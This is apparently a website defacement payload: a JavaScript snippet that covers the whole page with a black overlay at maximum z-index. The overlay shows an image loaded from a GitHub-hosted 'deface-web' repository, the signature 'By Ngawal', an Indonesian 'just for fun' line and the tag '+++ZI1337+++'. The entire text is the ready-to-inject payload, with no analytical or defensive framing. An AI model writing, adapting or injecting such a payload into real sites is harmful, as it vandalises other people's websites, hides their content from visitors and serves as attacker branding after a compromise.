let overlay = document.createElement('div');

Object.assign(overlay.style, {
  position: 'fixed',
  top: '0',
  left: '0',
  width: '100%',
  height: '100%',
  backgroundColor: 'black',
  color: 'white',
  textAlign: 'center',
  zIndex: '999999',
  fontFamily: 'Acme, sans-serif',
  overflowY: 'auto'
});

overlay.innerHTML = `
  <div style="padding-top: 60px;">
    <img src="https://cdn.jsdelivr.net/gh/zaytnav1337/deface-web@main/deface.jpg" 
         style="max-width: 100%; height: 75vh; object-fit: cover;">
    <div style="margin-top: 30px;">
      <h1 style="font-size:2.8vw;">By Ngawal</h1>
      <p style="color:red; font-size:18px;">Hanya Untuk Bersenang-Senang<br></p>
      <p style="color:white; font-size:16px;">+++ZI1337+++</p>
    </div>
  </div>
`;

document.body.appendChild(overlay);
